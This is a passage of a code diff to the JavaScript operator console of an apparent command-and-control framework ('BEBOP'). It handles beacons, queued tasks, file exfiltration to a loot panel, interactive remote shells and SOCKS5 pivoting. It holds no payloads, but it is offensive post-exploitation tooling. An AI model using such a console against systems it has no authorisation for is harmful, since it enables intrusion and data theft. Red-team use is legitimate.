+    if (action === 'add') {
+        const isNew = !_beacons[data.id];
+        _beacons[data.id] = data;
+        _renderSessionsFromCache();
+        if (isNew) {
+            showToast(data.hostname, data.username);
+        }
+        return;
+    }
+    if (action === 'checkin') {
+        const b = _beacons[data.id];
+        if (b) {
+            const wasAlive = b.alive;
+            b.last_seen = Math.floor(Date.now() / 1000);
+            b.alive = true;
+            if (data.id === _actualBid() && !_isSessionTab() && (_pendingTasks[beaconId] || 0) > 0) {
+                appendLine('[+] task delivered to beacon', 'hint');
+                _pendingTasks[beaconId]--;
+                _writePrompt();
+                if (_term) _term.scrollToBottom();
+            }
+            if (!wasAlive) {
+                _renderSessionsFromCache();
+            } else {
+                const td = document.querySelector(`tr[data-beacon-id="${data.id}"] td[data-ts]`);
+                if (td) { td.dataset.ts = b.last_seen; td.textContent = timeAgo(b.last_seen); }
+            }
+        }
+        return;
+    }
+    if (action === 'update') {
+        const b = _beacons[data.id];
+        if (b) {
+            if (data.sleep !== undefined) b.sleep = data.sleep;
+            if (data.jitter !== undefined) b.jitter = data.jitter;
+            if (data.mode !== undefined) b.mode = data.mode;
+            if (data.shell_active !== undefined) b.shell_active = data.shell_active;
+            if (data.socks_active !== undefined) b.socks_active = data.socks_active;
+            if (data.socks_host !== undefined) b.socks_host = data.socks_host;
+            if (data.socks_port !== undefined) b.socks_port = data.socks_port;
+            _renderSessionsFromCache();
+        }
+        return;
+    }
+    if (action === 'delete') {
+        delete _beacons[data.id];
+        _renderSessionsFromCache();
+        return;
+    }
+}
+
+function _handleResultsMsg(action, data) {
+    if (action !== 'add') return;
+    if (_isSessionTab()) return;
+    if (data.beacon_id !== _actualBid()) return;
+    if (data.label && !_tabLabels[data.label]) return;
+    if (data.label && _tabLabels[data.label] !== beaconId) return;
+
+    const result = {
+        label: data.label,
+        beacon_id: data.beacon_id,
+        flags: data.flags || 0,
+        type: data.type || 0,
+        filename: data.filename || '',
+        output: data.output,
+        received_at: data.received_at
+    };
+
+    if (result.type === 3) {
+        appendLine('[+] ' + (result.output || 'upload complete'), 'output');
+    } else if (result.type === 4) {
+        appendLine('[+] exfil complete: ' + (result.filename || '?'), 'output');
+        appendLine('    check the LOOT tab to download or delete', 'hint');
+        loadLootPanel();
+    } else if (result.type === 2) {
+        appendLine('[+] ' + (result.output || 'config updated'), 'hint');
+    } else {
+        appendLine(result.output || '', 'output');
+    }
+    if (data.received_at > pollSince) pollSince = data.received_at;
+    if (_term) _term.scrollToBottom();
+    _serverSaveDirty = true;
+}
+
+function _handleEventsMsg(action, data) {
+    if (action === 'sync') {
+        const panel = document.getElementById('event-log-body');
+        if (!panel) return;
+        panel.innerHTML = '';
+        _eventLog = [];
+        if (Array.isArray(data)) {
+            data.forEach(evt => _appendEventEntry(evt));
+        }
+        return;
+    }
+    if (action === 'add') {
+        _appendEventEntry(data);
+        return;
+    }
+}
+
+function _handleLootMsg(action, data) {
+    if (action === 'add' || action === 'delete' || action === 'sync') {
+        loadLootPanel();
+    }
+}
+
+function _handleListenersMsg(action, data) {
+    if (action === 'sync' || action === 'add' || action === 'delete') {
+        loadListeners();
+    }
+}
+
+function _handleSocksMsg(action, data) {
+    if (action === 'started') {
+        if (data && data.beacon_id != null) {
+            const b = _beacons[data.beacon_id];
+            if (b) {
+                b.socks_active = true;
+                b.socks_host   = data.host || '';
+                b.socks_port   = data.port || 0;
+            }
+            updateSocksBadge(data.beacon_id, data.host || '', data.port || 0);
+            const ts = _formatTs(new Date());
+            _renderEventEntry(ts, 'SOCKS5 started for beacon #' + data.beacon_id + ' on ' + (data.host || '?') + ':' + (data.port || '?'));
+        }
+        return;
+    }
+    if (action === 'stopped') {
+        if (data && data.beacon_id != null) {
+            const b = _beacons[data.beacon_id];
+            if (b) {
+                b.socks_active = false;
+                b.socks_host   = '';
+                b.socks_port   = 0;
+            }
+            removeSocksBadge(data.beacon_id);
+            const ts = _formatTs(new Date());
+            _renderEventEntry(ts, 'SOCKS5 stopped for beacon #' + data.beacon_id);
+        }
+        return;
+    }
+}
+
+function updateSocksBadge(beaconId, host, port) {
+    const row = document.querySelector('#beacons-table tbody tr[data-beacon-id="' + beaconId + '"]');
+    if (!row) return;
+    // Status cell is td[0]; hostname cell is td[1] — badges live in td[1]
+    const cell = row.cells[1];
+    if (!cell) return;
+    let badge = cell.querySelector('.badge-socks5');
+    if (!badge) {
+        badge = document.createElement('span');
+        badge.className = 'badge-socks5';
+        cell.appendChild(badge);
+    }
+    badge.textContent = 'SOCKS5 ' + host + ':' + port;
+}
+
+function removeSocksBadge(beaconId) {
+    const row = document.querySelector('#beacons-table tbody tr[data-beacon-id="' + beaconId + '"]');
+    if (!row) return;
+    const badge = row.querySelector('.badge-socks5');
+    if (badge) badge.parentNode.removeChild(badge);
+}
+
 async function loadSessions() {
     const tsUrl = getTsUrl();
-    const grid  = document.getElementById('sessions-grid');
     const noMsg = document.getElementById('no-sessions');
 
     if (!tsUrl) {
-        if (grid)  grid.innerHTML = '';
         if (noMsg) {
             noMsg.innerHTML = 'Enter teamserver IP and port above and click Connect.' +
                 '<span class="empty-quote">"See you, space cowboy..."</span>';
@@ -661,141 +1548,25 @@ async function loadSessions() {
     }
 
     try {
-        const resp    = await fetch(tsUrl + '/api/sessions');
+        const resp    = await authFetch(tsUrl + '/api/sessions');
         if (!resp.ok) throw new Error('HTTP ' + resp.status);
         const beacons = await resp.json();
-
-        updateConnIndicator(true);
-
-        const aliveBeacons = beacons.filter(b => b.alive).length;
-        const titleEl = document.getElementById('sessions-title');
-        if (titleEl) {
-            titleEl.innerHTML = `Sessions <span class="count-minimal">// ${aliveBeacons} active</span>`;
-        }
-
-        if (_currentView === 'map') {
-            renderMap(beacons);
-        } else if (_currentView === 'table') {
-            renderTable(beacons);
-        }
-
-        if (!grid) return;
-
-        if (beacons.length === 0) {
-            grid.innerHTML = '';
-            if (noMsg && _currentView !== 'map') {
-                noMsg.innerHTML = 'No active beacons.' +
-                    '<span class="empty-quote">"You\'re gonna carry that weight."</span>';
-                noMsg.style.display = '';
-            } else if (noMsg) {
-                noMsg.style.display = 'none';
-            }
-            if (_knownBeaconIds === null) _knownBeaconIds = new Set();
+        _beacons = {};
+        beacons.forEach(b => { _beacons[b.id] = b; });
+        _renderSessionsList(beacons);
+    } catch (e) {
+        // If we have fresh data from the operator WebSocket, render from that
+        // cache instead of showing an offline error — the WS is the primary
+        // realtime source; the HTTP fetch is a bootstrap fallback.
+        if (_beacons && Object.keys(_beacons).length > 0) {
+            _renderSessionsFromCache();
             return;
         }
-        if (noMsg) noMsg.style.display = 'none';
-
-        // Toast + event log for new beacons
-        if (_knownBeaconIds === null) {
-            _knownBeaconIds = new Set();
-            _knownBeaconAlive = {};
-            for (const b of beacons) {
-                _knownBeaconIds.add(b.id);
-                _knownBeaconAlive[b.id] = b.alive;
-            }
-        } else {
-            for (const b of beacons) {
-                if (!_knownBeaconIds.has(b.id)) {
-                    _knownBeaconIds.add(b.id);
-                    _knownBeaconAlive[b.id] = b.alive;
-                    showToast(b.hostname || '?', b.username || '?');
-                }
-                _knownBeaconAlive[b.id] = b.alive;
-            }
-        }
-
-        // Diff update: animate only new cards, update existing in-place
-        const rendered = new Set(
-            [...grid.querySelectorAll('.beacon-card')].map(el => el.dataset.id)
-        );
-        const incoming = new Set(beacons.map(b => String(b.id)));
-
-        // Remove stale cards
-        grid.querySelectorAll('.beacon-card').forEach(el => {
-            if (!incoming.has(el.dataset.id)) el.remove();
-        });
-
-        beacons.forEach((b, i) => {
-            const status = beaconStatus(b);
-            const os     = (PLATFORM_MAP[b.platform] ?? String(b.platform)) +
-                           ' ' + (ARCH_MAP[b.arch] ?? String(b.arch));
-            const integ  = INTEGRITY_MAP[b.integrity] ?? String(b.integrity);
-            const sleep  = b.sleep + 's' + (b.jitter_pct != null ? ' / ' + b.jitter_pct + '% jitter' : '');
-            const sid    = String(b.id);
-
-            let card = grid.querySelector('.beacon-card[data-id="' + sid + '"]');
-            if (card) {
-                // Update mutable fields only — no re-animation
-                card.className = 'beacon-card beacon-' + status;
-                card.querySelector('.card-badge').className   = 'card-badge badge-' + status;
-                card.querySelector('.card-badge').textContent = status.toUpperCase();
-                const vals = card.querySelectorAll('.meta-value');
-                if (vals[0]) vals[0].textContent = b.username || '—';
-                if (vals[1]) vals[1].textContent = os;
-                if (vals[2]) vals[2].textContent = integ;
-                if (vals[3]) vals[3].textContent = b.process_id;
-                if (vals[4]) vals[4].textContent = b.listener_name || '—';
-                if (vals[5]) vals[5].textContent = sleep;
-                if (vals[6]) { vals[6].dataset.ts = b.last_seen; vals[6].textContent = timeAgo(b.last_seen); }
-                let dq = card.querySelector('.card-dead-quote');
-                if (!b.alive && !dq) {
-                    dq = document.createElement('div');
-                    dq.className = 'card-dead-quote';
-                    dq.innerHTML = '<em>"Whatever happens, happens."</em>';
-                    card.querySelector('.card-actions').before(dq);
-                } else if (b.alive && dq) {
-                    dq.remove();
-                }
-            } else {
-                // New card — animate
-                card = document.createElement('div');
-                card.className    = 'beacon-card beacon-' + status;
-                card.dataset.id   = sid;
-                card.style.animationDelay = (i * 0.06) + 's';
-                card.innerHTML =
-                    '<div class="card-header">' +
-                        '<div class="card-hostname">' +
-                            '<span class="status-dot"></span>' +
-                            escapeHtml(b.hostname || '?') +
-                        '</div>' +
-                        '<span class="card-badge badge-' + status + '">' + status.toUpperCase() + '</span>' +
-                    '</div>' +
-                    '<div class="card-meta">' +
-                        '<span class="meta-label">USER</span><span class="meta-value">'  + escapeHtml(b.username || '—') + '</span>' +
-                        '<span class="meta-label">OS</span><span class="meta-value">'    + escapeHtml(os) + '</span>' +
-                        '<span class="meta-label">INTEG</span><span class="meta-value">' + escapeHtml(integ) + '</span>' +
-                        '<span class="meta-label">PID</span><span class="meta-value">'   + b.process_id + '</span>' +
-                        '<span class="meta-label">LISTENER</span><span class="meta-value" style="color: var(--blue)">' + escapeHtml(b.listener_name || '—') + '</span>' +
-                        '<span class="meta-label">SLEEP</span><span class="meta-value">' + escapeHtml(sleep) + '</span>' +
-                        '<span class="meta-label">SEEN</span><span class="meta-value" data-ts="' + b.last_seen + '">'  + timeAgo(b.last_seen) + '</span>' +
-                    '</div>' +
-                    (!b.alive ? '<div class="card-dead-quote"><em>"Whatever happens, happens."</em></div>' : '') +
-                    '<div class="card-actions">' +
-                        '<a href="/interact/' + b.id + '" class="btn-interact" ' +
-                           'onclick="openTerminal(' + b.id + '); return false;">INTERACT</a>' +
-                        '<button class="' + (b.alive ? 'btn-kill' : 'btn-delete') + '" onclick="showKillModal(' + b.id + ', \'' + escapeHtml(b.hostname || '') + '\', ' + !b.alive + ')">' + (b.alive ? 'KILL' : 'DELETE') + '</button>' +
-                    '</div>';
-                grid.appendChild(card);
-            }
-        });
-
-    } catch (e) {
         if (noMsg) {
             noMsg.innerHTML = 'Cannot reach teamserver &mdash; ' + escapeHtml(e.message) +
                 '<span class="empty-quote">"The music\'s over. Try again."</span>';
             noMsg.style.display = '';
         }
-        if (grid) grid.innerHTML = '';
         updateConnIndicator(false);
         console.error('loadSessions:', e);
     }
@@ -807,8 +1578,7 @@ let cmdHistory   = [];
 let historyIdx   = -1;
 let pollSince        = 0;
 let beaconId         = null;
-let pollInterval     = null;
-let _pendingTasks    = 0;
+const _pendingTasks  = {};
 let _lastSeenPrev    = 0;
 
 // Xterm state
@@ -829,7 +1599,7 @@ async function _saveTerminalToServer(id) {
     const state = _beaconStates[id];
     if (!state) return;
     try {
-        await fetch(tsUrl + '/api/terminal/' + id, {
+        await authFetch(tsUrl + '/api/terminal/' + id, {
             method: 'PUT',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -845,7 +1615,7 @@ async function _loadTerminalFromServer(id) {
     const tsUrl = getTsUrl();
     if (!tsUrl) return null;
     try {
-        const resp = await fetch(tsUrl + '/api/terminal/' + id);
+        const resp = await authFetch(tsUrl + '/api/terminal/' + id);
         if (!resp.ok) return null;
         const state = await resp.json();
         if (!state || !state.output_log) return null;
@@ -862,9 +1632,13 @@ async function _loadTerminalFromServer(id) {
 function _saveTabs() {
     try {
         const tabs = [];
-        for (const [id, tab] of _openTabs) tabs.push({ id, hostname: tab.hostname });
+        for (const [id, tab] of _openTabs) {
+            if (typeof id === 'string' && id.startsWith('shell_')) continue;
+            tabs.push({ id, hostname: tab.hostname });
+        }
         localStorage.setItem('bebop_tabs', JSON.stringify(tabs));
-        localStorage.setItem('bebop_active', beaconId != null ? String(beaconId) : '');
+        const activeToSave = (typeof beaconId === 'string' && beaconId.startsWith('shell_')) ? '' : (beaconId != null ? String(beaconId) : '');
+        localStorage.setItem('bebop_active', activeToSave);
         localStorage.setItem('bebop_panelOpen', document.body.classList.contains('panel-open') ? '1' : '0');
     } catch (_) {}
 }
@@ -875,7 +1649,13 @@ function _loadTabs() {
         const activeRaw = localStorage.getItem('bebop_active');
         if (tabsRaw) {
             const tabs = JSON.parse(tabsRaw);
-            for (const t of tabs) _openTabs.set(t.id, { hostname: t.hostname });
+            for (const t of tabs) {
+                _openTabs.set(t.id, { hostname: t.hostname });
+                // Re-resolve stale/unknown hostnames from the current session list.
+                const isShell = typeof t.id === 'string' && t.id.startsWith('shell_');
+                const stale   = !t.hostname || t.hostname === '?' || (isShell && t.hostname === 'SHELL');
+                if (stale) _fetchTabHostname(t.id);
+            }
         }
         if (_openTabs.size > 0) {
             if (activeRaw) {
@@ -892,6 +1672,7 @@ let _serverSaveDirty = false;
 
 setInterval(async () => {
     if (!_serverSaveDirty || beaconId == null) return;
+    if (typeof beaconId === 'string' && beaconId.startsWith('shell_')) return;
     _beaconStates[beaconId] = {
         outputLog: _outputLog.slice(),
         cmdHistory: cmdHistory.slice(),
@@ -903,6 +1684,7 @@ setInterval(async () => {
 
 function _saveBeaconState(id) {
     if (id == null || !_term) return;
+    if (typeof id === 'string' && id.startsWith('shell_')) return;
     _beaconStates[id] = {
         outputLog:  _outputLog.slice(),
         cmdHistory: cmdHistory.slice(),
@@ -974,11 +1756,18 @@ function _renderEventEntry(ts, msg) {
     body.scrollTop = body.scrollHeight;
 }
 
+function _appendEventEntry(evt) {
+    const d  = new Date(evt.timestamp);
+    const ts = _formatTs(d);
+    _eventLog.push({ ts, type: evt.type, msg: evt.message });
+    _renderEventEntry(ts, evt.message);
+}
+
 async function loadEventLog() {
     const tsUrl = getTsUrl();
     if (!tsUrl) return;
     try {
-        const resp = await fetch(tsUrl + '/api/events');
+        const resp = await authFetch(tsUrl + '/api/events');
         if (!resp.ok) return;
         const events = await resp.json();
         if (!events) return;
@@ -992,11 +1781,7 @@ async function loadEventLog() {
         }
 
         for (let i = knownCount; i < events.length; i++) {
-            const ev = events[i];
-            const d = new Date(ev.timestamp);
-            const ts = _formatTs(d);
-            _eventLog.push({ ts, type: ev.type, msg: ev.message });
-            _renderEventEntry(ts, ev.message);
+            _appendEventEntry(events[i]);
         }
     } catch (_) {}
 }
@@ -1043,33 +1828,6 @@ const ANSI = {
 };
 
 const PROMPT_STR = ANSI.amber + '[BEBOP ~]$ ' + ANSI.reset;
-
-function getBeaconId() {
-    const parts = window.location.pathname.split('/');
-    return parseInt(parts[parts.length - 1], 10);
-}
-
-async function loadBeaconInfo(id) {
-    const tsUrl = getTsUrl();
-    if (!tsUrl) return;
-    try {
-        const resp    = await fetch(tsUrl + '/api/sessions');
-        const beacons = await resp.json();
-        const b = beacons.find(x => x.id === id);
-        if (!b) return;
-        if (_lastSeenPrev === 0) _lastSeenPrev = b.last_seen;
-        const text = [
-            (b.hostname || '?'),
-            (b.username || '?'),
-            'PID ' + b.process_id,
-            'Sleep ' + b.sleep + 's',
-            INTEGRITY_MAP[b.integrity] ?? ''
-        ].join(' // ');
-        const el = document.getElementById('beacon-info')
-                || document.getElementById('panel-beacon-info');
-        if (el) el.textContent = text;
-    } catch (_) {}
-}
 
 // ---- Xterm helpers ----
 
@@ -1148,6 +1906,7 @@ function _handleTab() {
 // ---- Line input handler ----
 
 function _handleData(data) {
+
     switch (data) {
         case '\x1b[A': // Arrow Up
             if (!cmdHistory.length) return;
@@ -1283,7 +2042,7 @@ async function _processCommand(cmd) {
         reg_query: '<HIVE\\key> <value>',
         reg_set:   '<HIVE\\key> <value> <data>',
         runas:     '<user> <pass> <cmd>',
-        shell:     '<cmd>',
+        /* shell: no args = interactive shell, with args = cmd.exe /c */
         sleep:     '<seconds> [jitter%]',
         getenv:    '<name>',
     };
@@ -1310,8 +2069,89 @@ async function _processCommand(cmd) {
 
     const tsUrl = getTsUrl();
     if (!tsUrl) { appendLine('[error] teamserver not configured', 'err'); _writePrompt(); return; }
-    if (beaconId === null || isNaN(beaconId)) {
+    if (beaconId === null || isNaN(_actualBid())) {
         appendLine('[error] no beacon selected', 'err'); _writePrompt(); return;
+    }
+
+    // ---- Interactive session upgrade ----
+
+    if (baseCmd === 'interactive') {
+        showShellModal(_actualBid(), '');
+        _writePrompt();
+        return;
+    }
+
+    if (baseCmd === 'shell' && !cmdArgs) {
+        if (_beaconModes[_actualBid()] !== 'session') {
+            appendLine('[!] shell requires session mode — type "interactive" first', 'err');
+        } else {
+            openShellTerminal(_actualBid());
+        }
+        _writePrompt();
+        return;
+    }
+
+    // ---- SOCKS5 proxy control ----
+
+    if (baseCmd === 'socks5') {
+        if (_beaconModes[_actualBid()] !== 'session') {
+            appendLine('[!] socks5 requires session mode — type "interactive" first', 'err');
+            _writePrompt();
+            return;
+        }
+
+        const subArgs = cmdArgs.trim().split(/\s+/);
+        const subCmd  = subArgs[0] ? subArgs[0].toLowerCase() : '';
+
+        if (subCmd !== 'start' && subCmd !== 'stop') {
+            appendLine('[error] usage: socks5 start [port] | socks5 stop', 'err');
+            _writePrompt();
+            return;
+        }
+
+        if (!tsUrl) { appendLine('[error] teamserver not configured', 'err'); _writePrompt(); return; }
+
+        if (subCmd === 'start') {
+            const body = { beacon_id: _actualBid() };
+            if (subArgs[1]) {
+                const p = parseInt(subArgs[1], 10);
+                if (isNaN(p) || p < 1 || p > 65535) {
+                    appendLine('[error] invalid port — must be 1-65535', 'err');
+                    _writePrompt();
+                    return;
+                }
+                body.port = p;
+            }
+            try {
+                const r = await authFetch(tsUrl + '/api/socks', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body),
+                });
+                if (!r.ok) {
+                    const t = await r.text();
+                    appendLine('[!] socks5 start failed: ' + t, 'err');
+                } else {
+                    appendLine('[*] SOCKS5 proxy start requested', 'hint');
+                }
+            } catch (err) {
+                appendLine('[!] socks5 start error: ' + err.message, 'err');
+            }
+        } else {
+            try {
+                const r = await authFetch(tsUrl + '/api/socks/' + _actualBid(), { method: 'DELETE' });
+                if (!r.ok) {
+                    const t = await r.text();
+                    appendLine('[!] socks5 stop failed: ' + t, 'err');
+                } else {
+                    appendLine('[*] SOCKS5 proxy stop requested', 'hint');
+                }
+            } catch (err) {
+                appendLine('[!] socks5 stop error: ' + err.message, 'err');
+            }
+        }
+        _writePrompt();
+        return;
     }
 
     // ---- File transfer builtins ----
@@ -1320,13 +2160,13 @@ async function _processCommand(cmd) {
         const remotePath = cmd.slice(9).trim();
         if (!remotePath) { appendLine('[error] usage: download <remote_path>', 'err'); _writePrompt(); return; }
         try {
-            const resp = await fetch(tsUrl + '/api/task', {
+            const resp = await authFetch(tsUrl + '/api/task', {
                 method:  'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body:    JSON.stringify({ beacon_id: beaconId, type: 4, code: 0, args: remotePath }),
+                body:    JSON.stringify(Object.assign({ beacon_id: _actualBid(), type: 4, code: 0, args: remotePath }, _isSessionTab() ? {} : { transport: 'http' })),
             });
             if (!resp.ok) appendLine('[error] server returned ' + resp.status, 'err');
-            else        { appendLine('[+] exfil queued: ' + remotePath, 'hint'); _pendingTasks++; }
+            else        { try { const rj = await resp.json(); if (rj.label) _tabLabels[rj.label] = beaconId; } catch(_){} appendLine('[+] exfil queued: ' + remotePath, 'hint'); _pendingTasks[beaconId] = (_pendingTasks[beaconId] || 0) + 1; }
         } catch (e) { appendLine('[error] ' + e.message, 'err'); }
         _writePrompt();
         return;
@@ -1347,15 +2187,16 @@ async function _processCommand(cmd) {
             const file = picker.files[0];
             if (!file) return;
             const fd = new FormData();
-            fd.append('beacon_id', String(beaconId));
+            fd.append('beacon_id', String(_actualBid()));
             fd.append('dest_path', destPath);
             fd.append('file', file);
             try {
-                const r = await fetch(tsUrl + '/api/upload', { method: 'POST', body: fd });
+                const r = await authFetch(tsUrl + '/api/upload', { method: 'POST', body: fd });
                 if (!r.ok) { appendLine('[error] upload failed: ' + r.status, 'err'); return; }
                 const j = await r.json();
+                if (j.label) _tabLabels[j.label] = beaconId;
                 appendLine('[+] upload queued: ' + j.chunks + ' chunk(s) -> ' + destPath, 'hint');
-                _pendingTasks++;
+                _pendingTasks[beaconId] = (_pendingTasks[beaconId] || 0) + 1;
             } catch (e) { appendLine('[error] ' + e.message, 'err'); }
             picker.value = '';
         };
@@ -1389,21 +2230,21 @@ async function _processCommand(cmd) {
     }
 
     try {
-        const resp = await fetch(tsUrl + '/api/task', {
+        const _tb = { beacon_id: _actualBid(), type: taskType, code: taskCode, args: taskArgs };
+        if (!_isSessionTab()) _tb.transport = 'http';
+        const resp = await authFetch(tsUrl + '/api/task', {
             method:  'POST',
             headers: { 'Content-Type': 'application/json' },
-            body:    JSON.stringify({
-                beacon_id: beaconId,
-                type: taskType,
-                code: taskCode,
-                args: taskArgs
-            }),
+            body:    JSON.stringify(_tb),
         });
         if (!resp.ok) {
             appendLine('[error] server returned ' + resp.status + (resp.status === 404 ? ' (Beacon may not exist anymore)' : ''), 'err');
         } else {
-            appendLine('[+] task queued', 'hint');
-            _pendingTasks++;
+            try { const rj = await resp.json(); if (rj.label) _tabLabels[rj.label] = beaconId; } catch(_){}
+            if (!_isSessionTab()) {
+                appendLine('[+] task queued', 'hint');
+                _pendingTasks[beaconId] = (_pendingTasks[beaconId] || 0) + 1;
+            }
         }
     } catch (e) {
         appendLine('[error] ' + e.message, 'err');
@@ -1456,9 +2297,17 @@ function _initXterm(containerId) {
     term.onData(_handleData);
 }
 
+let _termFullscreen = false;
+
 function openFullscreenTerminal() {
-    if (beaconId === null || isNaN(beaconId)) return;
-    window.location.href = '/interact/' + beaconId;
+    _termFullscreen = !_termFullscreen;
+    document.body.classList.toggle('terminal-fullscreen', _termFullscreen);
+    setTimeout(() => {
+        if (_fitAddon) try { _fitAddon.fit(); } catch (_) {}
+        if (_shellFit) try { _shellFit.fit(); } catch (_) {}
+        if (_term) _term.scrollToBottom();
+        if (_shellTerm) _shellTerm.scrollToBottom();
+    }, 50);
 }
 
 function termFontSize(delta) {
@@ -1467,33 +2316,37 @@ function termFontSize(delta) {
     const next = Math.max(8, Math.min(28, cur + delta));
     _term.options.fontSize = next;
     if (_fitAddon) try { _fitAddon.fit(); } catch (_) {}
+    // Also resize shell xterm if it exists
+    if (_shellTerm) {
+        _shellTerm.options.fontSize = next;
+        if (_shellFit) try { _shellFit.fit(); } catch (_) {}
+    }
 }
 
 // ---- Poll results ----
 
 async function pollResults() {
     const tsUrl = getTsUrl();
-    if (!tsUrl || beaconId === null || isNaN(beaconId)) return;
+    if (!tsUrl || beaconId === null || isNaN(_actualBid())) return;
+    if (_isSessionTab()) return;
     try {
-        const sr = await fetch(tsUrl + '/api/sessions');
+        const sr = await authFetch(tsUrl + '/api/sessions');
         if (sr.ok) {
             const bs = await sr.json();
-            const b = bs.find(x => x.id === beaconId);
+            const b = bs.find(x => x.id === _actualBid());
             if (b) {
-                if (_lastSeenPrev > 0 && b.last_seen > _lastSeenPrev && _pendingTasks > 0) {
-                    appendLine('[+] task delivered to beacon', 'hint');
-                    _pendingTasks = 0;
-                }
                 _lastSeenPrev = b.last_seen;
             }
         }
     } catch (_) {}
     try {
-        const resp = await fetch(tsUrl + `/api/results/${beaconId}?since=${pollSince}`);
+        const resp = await authFetch(tsUrl + `/api/results/${_actualBid()}?since=${pollSince}`);
         if (!resp.ok) return;
         const results = await resp.json();
         let hasNew = false;
         for (const r of (results || [])) {
+            if (r.label && !_tabLabels[r.label]) { if (r.received_at > pollSince) pollSince = r.received_at; continue; }
+            if (r.label && _tabLabels[r.label] !== beaconId) { if (r.received_at > pollSince) pollSince = r.received_at; continue; }
             if (r.type === 3) {
                 appendLine('[+] ' + (r.output || 'upload complete'), 'output');
             } else if (r.type === 4) {
@@ -1516,17 +2369,33 @@ async function pollResults() {
 // ---- Tabbed terminal management ----
 
 const _openTabs = new Map();
+const _activeShells = new Set();
+const _tabLabels = {};
 
 function _renderTabs() {
     const bar = document.getElementById('terminal-tabs');
     if (!bar) return;
     bar.innerHTML = '';
     for (const [id, tab] of _openTabs) {
+        const isShell = typeof id === 'string' && id.startsWith('shell_');
+        const isSess  = typeof id === 'string' && id.startsWith('sess_');
         const el = document.createElement('div');
         el.className = 'terminal-tab' + (id === beaconId ? ' active' : '');
-        el.innerHTML =
-            '<span class="terminal-tab-name">#' + id + ' ' + escapeHtml(tab.hostname || '?') + '</span>' +
-            '<span class="terminal-tab-close" data-id="' + id + '">&times;</span>';
+        if (isShell) {
+            const hostname = escapeHtml(tab.hostname || '?');
+            el.innerHTML =
+                '<span class="terminal-tab-name" style="color:#AFA9EC"><span style="opacity:0.6;margin-right:5px">$_</span>' + hostname + '</span>' +
+                '<span class="terminal-tab-close" data-id="' + id + '">&times;</span>';
+        } else if (isSess) {
+            const hostname = escapeHtml(tab.hostname || '?');
+            el.innerHTML =
+                '<span class="terminal-tab-name" style="color:#AFA9EC"><span style="opacity:0.6;margin-right:5px">$_</span>' + hostname + '</span>' +
+                '<span class="terminal-tab-close" data-id="' + id + '">&times;</span>';
+        } else {
+            el.innerHTML =
+                '<span class="terminal-tab-name">' + escapeHtml(tab.hostname || '?') + '</span>' +
+                '<span class="terminal-tab-close" data-id="' + id + '">&times;</span>';
+        }
         el.addEventListener('click', (e) => {
             if (e.target.classList.contains('terminal-tab-close')) return;
             _switchTab(id);
@@ -1541,42 +2410,113 @@ function _renderTabs() {
 
 async function _switchTab(id) {
     if (id === beaconId) return;
-    _saveBeaconState(beaconId);
+    const oldId = beaconId;
+    const oldIsShell = typeof oldId === 'string' && oldId.startsWith('shell_');
+    const newIsShell = typeof id === 'string' && id.startsWith('shell_');
+
+    // Save current tab state
+    if (!oldIsShell) {
+        _saveBeaconState(oldId);
+    }
+    if (sessionWs) { sessionWs.close(); sessionWs = null; }
+
+    // Keep shell WebSocket alive when switching tabs — shell runs in background
 
     beaconId = id;
 
-    if (_term) {
-        _term.clear();
-        _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
-        _outputLog = [];
-    }
+    const termEl = document.getElementById('terminal');
+    const shellEl = document.getElementById('shell-terminal');
 
-    if (!_restoreBeaconState(id)) {
-        const serverState = await _loadTerminalFromServer(id);
-        if (serverState && serverState.outputLog.length > 0) {
-            _beaconStates[id] = serverState;
-            _restoreBeaconState(id);
-            pollSince = serverState.pollSince || 0;
+    if (newIsShell) {
+        // Switching TO a shell tab
+        const tab = _openTabs.get(id);
+        _activeShellBid = tab ? tab.shellBid : null;
+
+        if (termEl) termEl.style.display = 'none';
+        if (!_shellTerm) _initShellXterm();
+        if (shellEl) shellEl.style.display = '';
+
+        const entry = _shellWsMap.get(_activeShellBid);
+        if (!entry || !entry.ws || entry.ws.readyState !== WebSocket.OPEN) {
+            _shellTerm.clear();
+            _shellTerm.write('\x1b[2J\x1b[H');
+            _shellTerm.write('\x1b[33mReconnecting shell...\x1b[0m\r\n');
+            _connectShellWs(_activeShellBid);
+        } else if (entry.buffer.length > 0) {
+            for (const chunk of entry.buffer) _shellTerm.write(chunk);
+            entry.buffer = [];
         }
-    }
-    _writePrompt();
-    if (_term) { _term.scrollToBottom(); _term.focus(); }
 
-    if (pollInterval) clearInterval(pollInterval);
-    pollInterval = setInterval(pollResults, 2000);
-    pollResults();
+        if (_shellTerm) { _shellTerm.scrollToBottom(); _shellTerm.focus(); }
+        try { _shellFit.fit(); } catch(_) {}
+    } else {
+        // Switching TO a beacon/session tab
+        const isSessTab = typeof id === 'string' && id.startsWith('sess_');
+        const numId = isSessTab ? parseInt(id.slice(5), 10) : id;
+
+        if (shellEl) shellEl.style.display = 'none';
+        if (termEl) termEl.style.display = '';
+
+        if (_term) {
+            _term.clear();
+            _term.write('\x1b[2J\x1b[H');
+            _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
+            _outputLog = [];
+        }
+
+        if (!_restoreBeaconState(id)) {
+            if (!isSessTab) {
+                const serverState = await _loadTerminalFromServer(numId);
+                if (serverState && serverState.outputLog.length > 0) {
+                    _beaconStates[id] = serverState;
+                    _restoreBeaconState(id);
+                    pollSince = serverState.pollSince || 0;
+                }
+            } else {
+                pollSince = Math.floor(Date.now() / 1000) - 1;
+            }
+        }
+
+        _writePrompt();
+
+        pollResults();
+
+        if (isSessTab) connectSessionWs(numId);
+
+        setTimeout(() => { if (_term) { _term.scrollToBottom(); _term.focus(); } }, 10);
+        if (_fitAddon) try { _fitAddon.fit(); } catch(_) {}
+    }
 
     _renderTabs();
     _saveTabs();
 }
 
 function _closeTab(id) {
+    const isShell = typeof id === 'string' && id.startsWith('shell_');
+
+    // Close shell WebSocket but keep shell process alive on beacon
+    if (isShell) {
+        const tab = _openTabs.get(id);
+        const bid = tab ? tab.shellBid : null;
+        if (bid) {
+            const entry = _shellWsMap.get(bid);
+            if (entry && entry.ws) entry.ws.close();
+            _shellWsMap.delete(bid);
+        }
+        _activeShellBid = null;
+    }
+
     _openTabs.delete(id);
-    delete _beaconStates[id];
 
     if (id === beaconId) {
-        if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
